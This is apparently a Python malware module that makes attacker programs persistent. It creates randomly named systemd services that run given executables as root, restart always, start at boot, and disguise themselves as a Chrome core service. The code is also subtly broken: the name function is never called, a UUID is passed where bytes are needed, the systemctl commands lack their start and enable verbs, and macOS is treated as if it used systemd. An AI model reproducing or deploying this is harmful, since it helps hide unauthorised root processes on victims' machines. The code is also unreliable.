from base64 import b64encode
from uuid import uuid1
from os import system


class MakePersistent:
    def __init__(self, triggers: list, current_os, root_directory) -> None:
        self.triggers = triggers
        self.os = current_os
        self.root_directory = root_directory

    @staticmethod
    def get_file_name():
        return str(b64encode(uuid1())).replace("=", "")

    @staticmethod
    def create_service_file_content(file_path):

        service_file_content = f"""
        [Unit]
        Description=This is core service used by Chrome.
        
        [Service]
        User=root
        ExecStart={file_path}
        Restart=always
        
        [Install]
        WantedBy=multi-user.target
        """

        return service_file_content

    def create_persistence_linux(self):
        service_files = []
        for trigger in self.triggers:
            service_name = self.get_file_name
            try:
                with open(f"/etc/systemd/system/{service_name}.service", "w+") as service_writer:
                    service_writer.write(self.create_service_file_content(file_path=trigger))
            except Exception as e:
                continue
            else:
                system("sudo systemctl daemon-reload")

                # start service
                system(f"sudo systemctl {service_name}.service")

                # enable on boot
                system(f"sudo systemctl {service_name}.service")

                service_files.append(f"/etc/systemd/system/{service_name}.service")

        return service_files

    def make_persistent(self):
        files_created = []
        if self.os == "Linux" or self.os == "Darwin":
            files_created = self.create_persistence_linux()

        return files_created